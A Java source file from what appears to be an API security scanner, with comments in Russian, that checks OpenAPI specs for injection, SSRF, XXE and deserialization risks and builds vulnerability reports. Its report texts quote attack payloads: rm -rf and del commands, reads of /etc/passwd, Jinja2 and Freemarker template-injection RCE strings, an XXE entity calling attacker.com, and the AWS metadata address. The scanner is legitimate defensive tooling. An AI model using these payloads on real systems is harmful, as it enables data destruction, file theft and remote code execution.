package com.vtb.scanner.scanners;

import com.vtb.scanner.core.OpenAPIParser;
import com.vtb.scanner.heuristics.EnhancedRules;
import com.vtb.scanner.knowledge.CVEMapper;
import com.vtb.scanner.knowledge.CodeExamples;
import com.vtb.scanner.models.Severity;
import com.vtb.scanner.models.Vulnerability;
import com.vtb.scanner.models.VulnerabilityType;
import io.swagger.v3.oas.models.OpenAPI;
import io.swagger.v3.oas.models.Operation;
import io.swagger.v3.oas.models.PathItem;
import io.swagger.v3.oas.models.media.Schema;
import io.swagger.v3.oas.models.parameters.Parameter;
import lombok.extern.slf4j.Slf4j;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

/**
 * Сканер для обнаружения уязвимостей инъекций
 * SQL Injection, NoSQL Injection, Command Injection
 */
@Slf4j
public class InjectionScanner implements VulnerabilityScanner {
    
    /**
     * Максимальная глубина вложенности для анализа схем инъекций
     * 
     * КРИТИЧНО: Реальные API обычно имеют вложенность 2-8 уровней.
     * Очень сложные API могут иметь до 12-15 уровней.
     * Значение 20 обеспечивает покрытие даже самых сложных случаев без риска проблем производительности.
     */
    private static final int MAX_DEPTH = 20; // Увеличено с 10 до 20 для более точного анализа сложных API
    
    private final String targetUrl;
    
    // ВСЕ паттерны теперь в EnhancedRules! Никакого хардкода!
    
    public InjectionScanner(String targetUrl) {
        this.targetUrl = targetUrl;
    }
    
    @Override
    public List<Vulnerability> scan(OpenAPI openAPI, OpenAPIParser parser) {
        log.info("Запуск Injection Scanner...");
        List<Vulnerability> vulnerabilities = new ArrayList<>();
        
        // КРИТИЧНО: Защита от NPE
        if (openAPI == null || openAPI.getPaths() == null) {
            return vulnerabilities;
        }
        
        for (Map.Entry<String, PathItem> entry : openAPI.getPaths().entrySet()) {
            String path = entry.getKey();
            PathItem pathItem = entry.getValue();
            
            vulnerabilities.addAll(checkPathForInjection(path, pathItem, openAPI));
        }
        
        log.info("Injection Scanner завершен. Найдено уязвимостей: {}", vulnerabilities.size());
        return vulnerabilities;
    }
    
    /**
     * Проверка пути на инъекции
     */
    private List<Vulnerability> checkPathForInjection(String path, PathItem pathItem, OpenAPI openAPI) {
        List<Vulnerability> vulnerabilities = new ArrayList<>();
        
        // Проверяем все методы - ПЕРЕДАЁМ openAPI для SmartAnalyzer!
        if (pathItem.getGet() != null) {
            vulnerabilities.addAll(checkOperationForInjection(path, "GET", pathItem.getGet(), openAPI));
        }
        if (pathItem.getPost() != null) {
            vulnerabilities.addAll(checkOperationForInjection(path, "POST", pathItem.getPost(), openAPI));
        }
        if (pathItem.getPut() != null) {
            vulnerabilities.addAll(checkOperationForInjection(path, "PUT", pathItem.getPut(), openAPI));
        }
        if (pathItem.getDelete() != null) {
            vulnerabilities.addAll(checkOperationForInjection(path, "DELETE", pathItem.getDelete(), openAPI));
        }
        if (pathItem.getPatch() != null) {
            vulnerabilities.addAll(checkOperationForInjection(path, "PATCH", pathItem.getPatch(), openAPI));
        }
        
        return vulnerabilities;
    }
    
    /**
     * Проверка операции на инъекции
     */
    private List<Vulnerability> checkOperationForInjection(String path, String method, Operation operation, OpenAPI openAPI) {
        List<Vulnerability> vulnerabilities = new ArrayList<>();
        
        // ТЕПЕРЬ МОЖЕМ использовать SmartAnalyzer!
        int riskScore = com.vtb.scanner.heuristics.SmartAnalyzer.calculateRiskScore(
            path, method, operation, openAPI);
        
        // Проверяем параметры (передаем operation для семантики!)
        if (operation.getParameters() != null) {
            for (Parameter param : operation.getParameters()) {
                vulnerabilities.addAll(checkParameter(path, method, param, operation, riskScore));
            }
        }
        
        // Проверяем request body
        if (operation.getRequestBody() != null && 
            operation.getRequestBody().getContent() != null) {
            
            // Проверяем description на упоминания SQL - используем EnhancedRules!
            String description = operation.getRequestBody().getDescription();
            if (EnhancedRules.mentionsSQLInDescription(description)) {
                    vulnerabilities.add(createInjectionVulnerability(
                        path, method,
                        VulnerabilityType.SQL_INJECTION,
                        Severity.HIGH,
                        "Возможна SQL инъекция в теле запроса",
                        "Request body может содержать SQL запросы без валидации",
                        "Используйте параметризованные запросы и валидацию входных данных"
                    ));
            }
            
            // КРИТИЧНО: Проверяем schema на command injection поля!
            // Проверяем все content types (application/json, application/*+json, и т.д.)
            if (operation.getRequestBody().getContent() != null) {
                for (Map.Entry<String, io.swagger.v3.oas.models.media.MediaType> contentEntry : 
                     operation.getRequestBody().getContent().entrySet()) {
                    
                    String contentType = contentEntry.getKey();
                    io.swagger.v3.oas.models.media.MediaType mediaType = contentEntry.getValue();
                    
                    // Проверяем JSON content types
                    if (contentType != null && 
                        (contentType.contains("json") || contentType.equals("*/*"))) {
                        
                        if (mediaType != null && mediaType.getSchema() != null) {
                            io.swagger.v3.oas.models.media.Schema schema = mediaType.getSchema();
                            
                            // Если schema - это $ref, пытаемся разрешить через OpenAPI
                            if (schema.get$ref() != null && openAPI != null) {
                                schema = resolveSchemaRef(schema.get$ref(), openAPI);
                            }
                            
                            if (schema != null) {
                                vulnerabilities.addAll(checkRequestBodySchema(
                                    path, method, schema, operation, riskScore, openAPI));
                            }
                        }
                    }
                }
            }
        }
        
        return vulnerabilities;
    }
    
    /**
     * Проверка параметра на инъекции - РАСШИРЕННАЯ ЭВРИСТИКА
     * 
     * С СЕМАНТИЧЕСКИМ АНАЛИЗОМ + SmartAnalyzer (96 факторов!)
     */
    private List<Vulnerability> checkParameter(String path, String method, Parameter param,
                                               Operation operation, int riskScore) {
        List<Vulnerability> vulnerabilities = new ArrayList<>();
        String paramName = param.getName();
        
        // СЕМАНТИЧЕСКИЙ АНАЛИЗ - если это SEARCH/QUERY операция → SQL риск выше!
        com.vtb.scanner.semantic.OperationClassifier.OperationType opType = 
            com.vtb.scanner.semantic.OperationClassifier.classify(path, method, operation);
        
        boolean isSearchOperation = (opType == com.vtb.scanner.semantic.OperationClassifier.OperationType.SEARCH ||
                                    opType == com.vtb.scanner.semantic.OperationClassifier.OperationType.QUERY);
        
        // ТЕПЕРЬ ЕСТЬ riskScore от SmartAnalyzer! (96 факторов контекста)
        // Это учитывает: финансовые операции, админ пути, PII данные, и т.д.
        
        // 1. SQL Injection - используем EnhancedRules + СЕМАНТИКУ + SmartAnalyzer!
        if (EnhancedRules.isSQLInjectionRisk(param)) {
            int validationScore = EnhancedRules.scoreValidation(param);
            
            // УМНЫЙ расчёт severity:
            // 1. Базовая severity от SmartAnalyzer (учитывает контекст: финансы, админ, PII)
            Severity baseSeverity = com.vtb.scanner.heuristics.SmartAnalyzer.severityFromRiskScore(riskScore);
            
            // 2. Модифицируем на основе валидации
            Severity severity;
            if (validationScore == 0) {
                // НЕТ валидации - повышаем!
                severity = switch(baseSeverity) {
                    case INFO -> Severity.MEDIUM;
                    case LOW -> Severity.HIGH;
                    case MEDIUM, HIGH -> Severity.CRITICAL;
                    case CRITICAL -> Severity.CRITICAL;
                };
            } else if (validationScore < 50) {
                // Слабая валидация - оставляем или повышаем на 1
                severity = switch(baseSeverity) {
                    case INFO -> Severity.LOW;
                    case LOW -> Severity.MEDIUM;
                    case MEDIUM -> Severity.HIGH;
                    case HIGH, CRITICAL -> baseSeverity;
                };
            } else {
                // Есть валидация - можем снизить
                severity = switch(baseSeverity) {
                    case CRITICAL -> Severity.HIGH;
                    case HIGH -> Severity.MEDIUM;
                    default -> baseSeverity;
                };
            }
            
            if (severity != Severity.LOW) {
                CVEMapper.VulnerabilityKnowledge knowledge = 
                    CVEMapper.getKnowledge(VulnerabilityType.SQL_INJECTION);
                CodeExamples.CodeExample example = 
                    CodeExamples.getExample(VulnerabilityType.SQL_INJECTION);
                
                vulnerabilities.add(Vulnerability.builder()
                    .id(com.vtb.scanner.models.VulnerabilityIdGenerator.generateId(
                        VulnerabilityType.SQL_INJECTION, path, method, paramName, 
                        "SQL Injection risk in parameter"))
                    .type(VulnerabilityType.SQL_INJECTION)
                    .severity(severity)
                    .title("SQL Injection риск в параметре '" + paramName + "'")
                    .description(String.format(
                        "Параметр '%s' может использоваться в SQL запросах.\n\n" +
                        "Оценка валидации: %d/100 (%s)\n\n" +
                        "Риски:\n" +
                        "• Утечка данных через UNION SELECT\n" +
                        "• Удаление данных через DROP TABLE\n" +
                        "• Обход аутентификации через ' OR '1'='1\n\n" +
                        "%s",
                        paramName,
                        validationScore,
                        validationScore == 0 ? "НЕТ валидации!" :
                        validationScore < 50 ? "Слабая валидация" : "Есть валидация",
                        example != null ? "Примеры кода см. в рекомендациях" : ""
                    ))
                    .endpoint(path)
                    .method(method)
                    .recommendation(
                        example != null ? example.getGoodCode() :
                        "Используйте параметризованные запросы (Prepared Statements)"
                    )
                    .owaspCategory("Injection")
                    .evidence("Validation score: " + validationScore + "/100, Risk Score: " + riskScore)
                    .riskScore(riskScore) // Сохраняем для анализа!
                    .cwe(knowledge != null ? knowledge.getCwe() : null)
                    .cveExamples(knowledge != null ? knowledge.getCveExamples() : null)
                    .build());
            }
        }
        
        // 2. Command Injection - КРИТИЧНО!
        if (EnhancedRules.isCommandInjectionRisk(param)) {
            CVEMapper.VulnerabilityKnowledge knowledge = 
                CVEMapper.getKnowledge(VulnerabilityType.COMMAND_INJECTION);
            
            vulnerabilities.add(Vulnerability.builder()
                .id(com.vtb.scanner.models.VulnerabilityIdGenerator.generateId(
                    VulnerabilityType.COMMAND_INJECTION, path, method, paramName,
                    "Command Injection risk in parameter"))
                .type(VulnerabilityType.COMMAND_INJECTION)
                .severity(Severity.CRITICAL)
                .title("КРИТИЧНО! Command Injection в '" + paramName + "'")
                .description(String.format(
                    "Параметр '%s' может использоваться для выполнения системных команд!\n\n" +
                    "Примеры эксплуатации:\n" +
                    "• ; rm -rf / (Linux)\n" +
                    "• & del /F /S /Q C:\\* (Windows)\n" +
                    "• | cat /etc/passwd (pipe)\n\n" +
                    "Реальные инциденты: Equifax 2017, Log4Shell 2021",
                    paramName
                ))
                .endpoint(path)
                .method(method)
                .recommendation(
                    "НЕМЕДЛЕННО исправьте:\n\n" +
                    "1. НЕ используйте Runtime.exec() с пользовательским вводом!\n" +
                    "2. Используйте Java API вместо shell команд\n" +
                    "3. Если неизбежно:\n" +
                    "   - Строгий whitelist команд\n" +
                    "   - Валидация: только [a-zA-Z0-9_-]\n" +
                    "   - ProcessBuilder с массивом аргументов (не строка!)"
                )
                .owaspCategory("Command Injection (CRITICAL)")
                .evidence("Параметр может быть передан в shell")
                .cwe(knowledge != null ? knowledge.getCwe() : null)
                .cveExamples(knowledge != null ? knowledge.getCveExamples() : null)
                .build());
        }
        
        // 3. SSRF - используем EnhancedRules
        if (EnhancedRules.isSSRFRisk(param)) {
            CVEMapper.VulnerabilityKnowledge knowledge = 
                CVEMapper.getKnowledge(VulnerabilityType.SSRF);
            
            vulnerabilities.add(Vulnerability.builder()
                .id(com.vtb.scanner.models.VulnerabilityIdGenerator.generateId(
                    VulnerabilityType.SSRF, path, method, paramName,
                    "SSRF risk in parameter"))
                .type(VulnerabilityType.SSRF)
                .severity(Severity.HIGH)
                .title("SSRF риск в параметре '" + paramName + "'")
                .description(String.format(
                    "Параметр '%s' принимает URL и может быть использован для SSRF атаки.\n\n" +
                    "Атаки:\n" +
                    "• http://169.254.169.254/latest/meta-data/ (AWS metadata!)\n" +
                    "• http://localhost/admin (обход firewall)\n" +
                    "• file:///etc/passwd (file access)\n\n" +
                    "Реальный инцидент: Capital One 2019 - 100M клиентов через SSRF!",
                    paramName
                ))
                .endpoint(path)
                .method(method)
                .recommendation(
                    "Защита от SSRF:\n\n" +
                    "1. Whitelist допустимых доменов\n" +
                    "2. Запретите:\n" +
                    "   - localhost, 127.0.0.1, 0.0.0.0\n" +
                    "   - Private IP (10.0.0.0/8, 192.168.0.0/16)\n" +
                    "   - AWS metadata (169.254.169.254)\n" +
                    "   - file://, gopher://, dict://\n" +
                    "3. Валидируйте URL перед запросом\n" +
                    "4. Используйте DNS rebinding защиту"
                )
                .owaspCategory("API7:2023 - SSRF")
                .evidence("URL параметр без валидации")
                .cwe(knowledge != null ? knowledge.getCwe() : null)
                .cveExamples(knowledge != null ? knowledge.getCveExamples() : null)
                .build());
        }
        
        // НОВЫЕ ПРОВЕРКИ (14 паттернов из EnhancedRules!)
        
        // 4. NoSQL Injection
        if (EnhancedRules.isNoSQLRisk(param)) {
            vulnerabilities.add(Vulnerability.builder()
                .id(com.vtb.scanner.models.VulnerabilityIdGenerator.generateId(
                    VulnerabilityType.NOSQL_INJECTION, path, method, paramName,
                    "NoSQL Injection risk in parameter"))
                .type(VulnerabilityType.NOSQL_INJECTION)
                .severity(Severity.HIGH)
                .title("NoSQL Injection риск в '" + paramName + "'")
                .description(String.format(
                    "Параметр '%s' может быть передан в NoSQL query (MongoDB).\n\n" +
                    "Атаки:\n" +
                    "• $where: '1==1' → обход фильтров\n" +
                    "• $regex: '.*' → брутфорс данных\n" +
                    "• {$gt: ''} → получение всех записей\n\n" +
                    "Особенно опасно для MongoDB/CouchDB!",
                    paramName
                ))
                .endpoint(path)
                .method(method)
                .recommendation(
                    "Защита от NoSQL injection:\n\n" +
                    "1. Используйте типизированные queries\n" +
                    "2. Валидируйте все операторы\n" +
                    "3. Whitelist разрешенных MongoDB операторов\n" +
                    "4. НЕ передавайте JSON напрямую в db.find()\n" +
                    "5. Mongoose: используйте schemas"
                )
                .owaspCategory("Injection Attacks (NoSQL)")
                .evidence("MongoDB/NoSQL параметр: " + paramName)
                .confidence(com.vtb.scanner.heuristics.ConfidenceCalculator.calculateConfidence(
                    Vulnerability.builder()
                        .type(VulnerabilityType.NOSQL_INJECTION)
                        .severity(Severity.HIGH)
                        .build(),
                    operation, false, true))
                .priority(2)
                .build());
        }
        
        // 5. LDAP Injection
        if (EnhancedRules.isLDAPRisk(param)) {
            vulnerabilities.add(Vulnerability.builder()
                .id(com.vtb.scanner.models.VulnerabilityIdGenerator.generateId(
                    VulnerabilityType.LDAP_INJECTION, path, method, paramName,
                    "LDAP Injection risk in parameter"))
                .type(VulnerabilityType.LDAP_INJECTION)
                .severity(Severity.HIGH)
                .title("LDAP Injection риск в '" + paramName + "'")
                .description(String.format(
                    "Параметр '%s' может быть в LDAP query.\n\n" +
                    "Атаки:\n" +
                    "• admin*)(|(uid=* → обход аутентификации\n" +
                    "• *)(objectClass=* → извлечение всех данных\n\n" +
                    "Критично для корпоративных Active Directory!",
                    paramName
                ))
                .endpoint(path)
                .method(method)
                .recommendation(
                    "Защита от LDAP injection:\n\n" +
                    "1. Escape спецсимволы: *, (, ), \\, NUL\n" +
                    "2. Используйте prepared statements\n" +
                    "3. Whitelist разрешенных атрибутов\n" +
                    "4. Ограничьте scope поиска"
                )
                .owaspCategory("Injection Attacks (LDAP)")
                .evidence("LDAP параметр: " + paramName)
                .confidence(com.vtb.scanner.heuristics.ConfidenceCalculator.calculateConfidence(
                    Vulnerability.builder()
                        .type(VulnerabilityType.LDAP_INJECTION)
                        .severity(Severity.HIGH)
                        .build(),
                    operation, false, true))
                .priority(2)
                .build());
        }
        
        // 6. Template Injection (SSTI) - КРИТИЧНО!
        if (EnhancedRules.isTemplateInjectionRisk(param)) {
            vulnerabilities.add(Vulnerability.builder()
                .id(com.vtb.scanner.models.VulnerabilityIdGenerator.generateId(
                    VulnerabilityType.SECURITY_MISCONFIGURATION, path, method, paramName,
                    "Server-Side Template Injection (SSTI) risk"))
                .type(VulnerabilityType.SECURITY_MISCONFIGURATION)
                .severity(Severity.CRITICAL)
                .title("КРИТИЧНО! Template Injection в '" + paramName + "'")
                .description(String.format(
                    "Параметр '%s' используется в template engine!\n\n" +
                    "SSTI → RCE (Remote Code Execution)!\n\n" +
                    "Атаки:\n" +
                    "• Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n" +
                    "• Freemarker: <#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}\n" +
                    "• Velocity: #set($str=$class.forName(\"java.lang.Runtime\"))\n\n" +
                    "Реальный инцидент: Uber 2016 - SSTI → data breach!",
                    paramName
                ))
                .endpoint(path)
                .method(method)
                .recommendation(
                    "НЕМЕДЛЕННО:\n\n" +
                    "1. НИКОГДА не передавайте user input в templates!\n" +
                    "2. Используйте sandboxed режим:\n" +
                    "   - Jinja2: SandboxedEnvironment\n" +
                    "   - Freemarker: Configuration.setNewBuiltinClassResolver(SAFER_RESOLVER)\n" +
                    "3. Валидация + whitelist символов\n" +
                    "4. Отключите опасные функции"
                )
                .owaspCategory("Injection Attacks (SSTI → RCE)")
                .evidence("Template параметр: " + paramName)
                .confidence(com.vtb.scanner.heuristics.ConfidenceCalculator.calculateConfidence(
                    Vulnerability.builder()
                        .type(VulnerabilityType.SECURITY_MISCONFIGURATION)
                        .severity(Severity.CRITICAL)
                        .build(),
                    operation, false, true)) // hasEvidence=true (нашли template параметр!)
                .priority(1)
                .build());
        }
        
        // 7. XML External Entity (XXE)
        if (EnhancedRules.isXMLRisk(param)) {
            vulnerabilities.add(Vulnerability.builder()
                .id(com.vtb.scanner.models.VulnerabilityIdGenerator.generateId(
                    VulnerabilityType.SECURITY_MISCONFIGURATION, path, method, paramName,
                    "XXE (XML External Entity) risk"))
                .type(VulnerabilityType.SECURITY_MISCONFIGURATION)
                .severity(Severity.HIGH)
                .title("XXE (XML External Entity) риск в '" + paramName + "'")
                .description(String.format(
                    "Параметр '%s' парсит XML!\n\n" +
                    "Атаки:\n" +
                    "• <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> → чтение файлов\n" +
                    "• <!ENTITY xxe SYSTEM \"http://attacker.com/?data\"> → SSRF\n" +
                    "• Billion Laughs → DoS\n\n" +
                    "Особенно опасно для SOAP APIs!",
                    paramName
                ))
                .endpoint(path)
                .method(method)
                .recommendation(
                    "Защита от XXE:\n\n" +
                    "1. Отключите external entities:\n" +
                    "   - Java: factory.setFeature(FEATURE_SECURE_PROCESSING, true)\n" +
                    "   - Python lxml: XMLParser(resolve_entities=False)\n" +
                    "2. Используйте JSON вместо XML\n" +
                    "3. Whitelist разрешенных DTD\n" +
                    "4. Ограничьте размер XML (max 10MB)"
                )
                .owaspCategory("Injection Attacks (XXE)")
                .evidence("XML/SOAP параметр: " + paramName)
                .confidence(com.vtb.scanner.heuristics.ConfidenceCalculator.calculateConfidence(
                    Vulnerability.builder()
                        .type(VulnerabilityType.SECURITY_MISCONFIGURATION)
                        .severity(Severity.HIGH)
                        .build(),
                    operation, false, true))
                .priority(2)
                .build());
        }
        
        // 8. Insecure Deserialization - КРИТИЧНО!
        if (EnhancedRules.isDeserializationRisk(param)) {
            vulnerabilities.add(Vulnerability.builder()
                .id(com.vtb.scanner.models.VulnerabilityIdGenerator.generateId(
                    VulnerabilityType.SECURITY_MISCONFIGURATION, path, method, paramName,
                    "Deserialization risk"))
                .type(VulnerabilityType.SECURITY_MISCONFIGURATION)
                .severity(Severity.CRITICAL)
                .title("КРИТИЧНО! Insecure Deserialization в '" + paramName + "'")
                .description(String.format(
                    "Параметр '%s' десериализует data!\n\n" +
                    "Deserialization → RCE через gadget chains!\n\n" +
                    "Уязвимые технологии:\n" +
                    "• Java: ObjectInputStream\n" +
                    "• Python: pickle.loads()\n" +
                    "• Ruby: Marshal.load()\n" +
                    "• PHP: unserialize()\n\n" +
                    "Реальные инциденты:\n" +
                    "• Apache Struts 2017 (Equifax)\n" +
                    "• JBoss 2015\n" +
                    "• Apache Commons Collections\n\n" +
                    "Один из самых опасных типов атак!",
                    paramName
                ))
                .endpoint(path)
                .method(method)
                .recommendation(
                    "НЕМЕДЛЕННО:\n\n" +
                    "1. НЕ десериализуйте untrusted data!\n" +
                    "2. Используйте JSON вместо native serialization\n" +
                    "3. Если неизбежно:\n" +
                    "   - Whitelist классов (Java: ValidatingObjectInputStream)\n" +
                    "   - Digital signature на сериализованных данных\n" +
                    "   - Sandboxing\n" +
                    "4. Используйте безопасные альтернативы:\n" +
                    "   - Jackson/Gson вместо ObjectInputStream\n" +
                    "   - MessagePack вместо pickle"
                )
                .owaspCategory("Insecure Deserialization → RCE (OWASP #8)")
                .evidence("Deserialization параметр: " + paramName)
                .confidence(com.vtb.scanner.heuristics.ConfidenceCalculator.calculateConfidence(
                    Vulnerability.builder()
                        .type(VulnerabilityType.SECURITY_MISCONFIGURATION)
                        .severity(Severity.CRITICAL)
                        .build(),
                    operation, false, true)) // hasEvidence=true
                .priority(1)
                .build());
        }
        
        // 9. Sensitive data в URL - используем EnhancedRules!
        if (EnhancedRules.isSensitiveDataInURL(param)) {
                vulnerabilities.add(Vulnerability.builder()
                .id(com.vtb.scanner.models.VulnerabilityIdGenerator.generateId(
                    VulnerabilityType.SENSITIVE_DATA_IN_URL, path, method, paramName,
                    "Sensitive data in URL parameter"))
                    .type(VulnerabilityType.SENSITIVE_DATA_IN_URL)
                    .severity(Severity.HIGH)
                    .title("Чувствительные данные в URL: '" + paramName + "'")
                    .description(
                        "Параметр '" + paramName + "' передается в query string.\n\n" +
                        "Проблемы:\n" +
                        "• Логируется в access logs\n" +
                        "• Сохраняется в browser history\n" +
                        "• Передается в Referer header\n" +
                        "• Видно в сети (даже через HTTPS!)"
                    )
                    .endpoint(path)
                    .method(method)
                    .recommendation(
                        "Передавайте чувствительные данные:\n" +
                        "• В Authorization header\n" +
                        "• В request body (POST/PUT)\n" +
                        "• НЕ в URL!"
                    )
                    .owaspCategory("Data Exposure")
                    .evidence("Query parameter: " + paramName)
                .confidence(com.vtb.scanner.heuristics.ConfidenceCalculator.calculateConfidence(
                    Vulnerability.builder()
                        .type(VulnerabilityType.SENSITIVE_DATA_IN_URL)
                        .severity(Severity.HIGH)
                        .build(),
                    operation, false, true))
                .priority(2)
                    .build());
        }
        
        return vulnerabilities;
    }
    
    /**
     * Проверить наличие валидации для параметра
     */
    private boolean hasProperValidation(Parameter param) {
        Schema schema = param.getSchema();
        if (schema == null) {
            return false;
        }
        
        // Проверяем наличие pattern, enum, format и т.д.
        return schema.getPattern() != null ||
               schema.getEnum() != null ||
               (schema.getFormat() != null && !schema.getFormat().isEmpty()) ||
               (schema.getMaxLength() != null && schema.getMaxLength() < 100);
    }
    
    /**
     * Проверка request body schema на инъекции
     * Рекурсивно проверяет все поля в schema
     */
    private List<Vulnerability> checkRequestBodySchema(String path, String method, 
                                                        io.swagger.v3.oas.models.media.Schema schema,
                                                        Operation operation, int riskScore) {
        return checkRequestBodySchema(path, method, schema, operation, riskScore, null);
    }
    
    private List<Vulnerability> checkRequestBodySchema(String path, String method, 
                                                        io.swagger.v3.oas.models.media.Schema schema,
                                                        Operation operation, int riskScore, OpenAPI openAPI) {
        return checkRequestBodySchema(path, method, schema, operation, riskScore, openAPI, 0, new HashSet<>());
    }
    
    /**
     * Рекурсивная проверка request body schema с защитой от циклических ссылок
     */
    private List<Vulnerability> checkRequestBodySchema(String path, String method, 
                                                        io.swagger.v3.oas.models.media.Schema schema,
                                                        Operation operation, int riskScore, OpenAPI openAPI,
                                                        int depth, Set<String> visited) {
        List<Vulnerability> vulnerabilities = new ArrayList<>();
        
        // КРИТИЧНО: Защита от превышения максимальной глубины
        if (depth > MAX_DEPTH) {
            log.warn("Достигнута максимальная глубина вложенности в InjectionScanner: {} (endpoint: {} {}). " +
                     "Возможно, некоторые уязвимости в глубоко вложенных полях не были обнаружены.",
                     MAX_DEPTH, path, method);
            return vulnerabilities;
        }
        
        // КРИТИЧНО: Разрешаем $ref ссылки перед анализом с защитой от циклов
        if (schema != null && schema.get$ref() != null && openAPI != null) {
            String ref = schema.get$ref();
            if (ref.startsWith("#/components/schemas/")) {
                String schemaName = ref.substring("#/components/schemas/".length());
                // КРИТИЧНО: Защита от циклических ссылок
                if (visited.contains(schemaName)) {
                    log.warn("Обнаружена циклическая ссылка в InjectionScanner: {}, пропускаем", ref);
                    return vulnerabilities;
                }
                visited.add(schemaName);
            }
            schema = resolveSchemaRef(schema.get$ref(), openAPI);
        }
        
        if (schema == null || schema.getProperties() == null) {
            return vulnerabilities;
        }
        
        @SuppressWarnings("rawtypes")
        Map properties = schema.getProperties();
        
        for (Object keyObj : properties.keySet()) {
            String fieldName = keyObj.toString();
            io.swagger.v3.oas.models.media.Schema fieldSchema = 
                (io.swagger.v3.oas.models.media.Schema) properties.get(keyObj);
            
            // Создаем временный Parameter для использования EnhancedRules
            io.swagger.v3.oas.models.parameters.Parameter tempParam = 
                new io.swagger.v3.oas.models.parameters.QueryParameter();
            tempParam.setName(fieldName);
            tempParam.setSchema(fieldSchema);
            
            // Command Injection в request body
            if (EnhancedRules.isCommandInjectionRisk(tempParam)) {
                CVEMapper.VulnerabilityKnowledge knowledge = 
                    CVEMapper.getKnowledge(VulnerabilityType.COMMAND_INJECTION);
                
                int confidence = com.vtb.scanner.heuristics.ConfidenceCalculator.calculateConfidence(
                    Vulnerability.builder()
                        .type(VulnerabilityType.COMMAND_INJECTION)
                        .severity(Severity.CRITICAL)
                        .riskScore(riskScore)
                        .build(),
                    operation, false, true);
                
                int priority = com.vtb.scanner.heuristics.ConfidenceCalculator.calculatePriority(
                    Vulnerability.builder()
                        .type(VulnerabilityType.COMMAND_INJECTION)
                        .severity(Severity.CRITICAL)
                        .build(),
                    confidence);
                
                vulnerabilities.add(Vulnerability.builder()
                    .id(com.vtb.scanner.models.VulnerabilityIdGenerator.generateId(
                        VulnerabilityType.COMMAND_INJECTION, path, method, fieldName,
                        "Command Injection risk in request body field"))
                    .type(VulnerabilityType.COMMAND_INJECTION)
                    .severity(Severity.CRITICAL)
                    .title("КРИТИЧНО! Command Injection в поле '" + fieldName + "' request body")
                    .description(String.format(
                        "Поле '%s' в request body может использоваться для выполнения системных команд!\n\n" +
                        "Примеры эксплуатации:\n" +
                        "• {\"command\": \"; rm -rf /\"} (Linux)\n" +
                        "• {\"command\": \"& del /F /S /Q C:\\*\"} (Windows)\n" +
                        "• {\"command\": \"| cat /etc/passwd\"} (pipe)\n\n" +
                        "Реальные инциденты: Equifax 2017, Log4Shell 2021",
                        fieldName
                    ))
                    .endpoint(path)
                    .method(method)
                    .recommendation(
                        "НЕМЕДЛЕННО исправьте:\n\n" +
                        "1. НЕ используйте Runtime.exec() с пользовательским вводом!\n" +
                        "2. Используйте Java API вместо shell команд\n" +
                        "3. Если неизбежно:\n" +
                        "   - Строгий whitelist команд\n" +
                        "   - Валидация: только [a-zA-Z0-9_-]\n" +
                        "   - ProcessBuilder с массивом аргументов (не строка!)"
                    )
                    .owaspCategory("Command Injection (CRITICAL)")
                    .evidence("Поле '" + fieldName + "' в request body может быть передано в shell")
                    .confidence(confidence)
                    .priority(priority)
                    .riskScore(riskScore)
                    .cwe(knowledge != null ? knowledge.getCwe() : null)
                    .cveExamples(knowledge != null ? knowledge.getCveExamples() : null)
                    .build());
            }
            
            // КРИТИЧНО: Разрешаем $ref ссылки перед рекурсией с защитой от циклов
            if (fieldSchema != null && fieldSchema.get$ref() != null && openAPI != null) {
                String ref = fieldSchema.get$ref();
                if (ref.startsWith("#/components/schemas/")) {
                    String schemaName = ref.substring("#/components/schemas/".length());
                    // КРИТИЧНО: Защита от циклических ссылок
                    if (visited.contains(schemaName)) {
                        log.warn("Обнаружена циклическая ссылка в InjectionScanner (field): {}, пропускаем", ref);
                        continue; // Пропускаем это поле
                    }
                    visited.add(schemaName);
                }
                fieldSchema = resolveSchemaRef(fieldSchema.get$ref(), openAPI);
            }
            
            // Рекурсивно проверяем вложенные объекты
            if (fieldSchema != null && ("object".equals(fieldSchema.getType()) || fieldSchema.getProperties() != null)) {
                vulnerabilities.addAll(checkRequestBodySchema(
                    path, method, fieldSchema, operation, riskScore, openAPI, depth + 1, new HashSet<>(visited)));
            }
            
            // Рекурсивно проверяем массивы
            if (fieldSchema != null && "array".equals(fieldSchema.getType()) && fieldSchema.getItems() != null) {
                io.swagger.v3.oas.models.media.Schema itemsSchema = fieldSchema.getItems();
                // КРИТИЧНО: Разрешаем $ref ссылки в items перед рекурсией с защитой от циклов
                if (itemsSchema != null && itemsSchema.get$ref() != null && openAPI != null) {
                    String ref = itemsSchema.get$ref();
                    if (ref.startsWith("#/components/schemas/")) {
                        String schemaName = ref.substring("#/components/schemas/".length());
                        // КРИТИЧНО: Защита от циклических ссылок
                        if (visited.contains(schemaName)) {
                            log.warn("Обнаружена циклическая ссылка в InjectionScanner (items): {}, пропускаем", ref);
                            continue; // Пропускаем этот массив
                        }
                        visited.add(schemaName);
                    }
                    itemsSchema = resolveSchemaRef(itemsSchema.get$ref(), openAPI);
                }
                if (itemsSchema != null) {
                vulnerabilities.addAll(checkRequestBodySchema(
                        path, method, itemsSchema, operation, riskScore, openAPI, depth + 1, new HashSet<>(visited)));
                }
            }
        }
        
        return vulnerabilities;
    }
    
    /**
     * Разрешить $ref ссылку на schema
     */
    private io.swagger.v3.oas.models.media.Schema resolveSchemaRef(String ref, OpenAPI openAPI) {
        if (ref == null || openAPI == null || openAPI.getComponents() == null) {
            return null;
        }
        
        // Формат: #/components/schemas/MySchema
        if (ref.startsWith("#/components/schemas/")) {
            String schemaName = ref.substring("#/components/schemas/".length());
            if (openAPI.getComponents().getSchemas() != null) {
                return openAPI.getComponents().getSchemas().get(schemaName);
            }
        }
        
        return null;
    }
    
    /**
     * Создать объект уязвимости инъекции
     */
    private Vulnerability createInjectionVulnerability(String endpoint, String method, 
                                                        VulnerabilityType type, Severity severity,
                                                        String title, String description, 
                                                        String recommendation) {
        return Vulnerability.builder()
            .id(com.vtb.scanner.models.VulnerabilityIdGenerator.generateId(
                type, endpoint, method, null, title))
            .type(type)
            .severity(severity)
            .title(title)
            .description(description)
            .endpoint(endpoint)
            .method(method)
            .recommendation(recommendation)
            .owaspCategory("OWASP - Injection")
            .evidence("Обнаружен параметр без должной валидации")
            .build();
    }
}

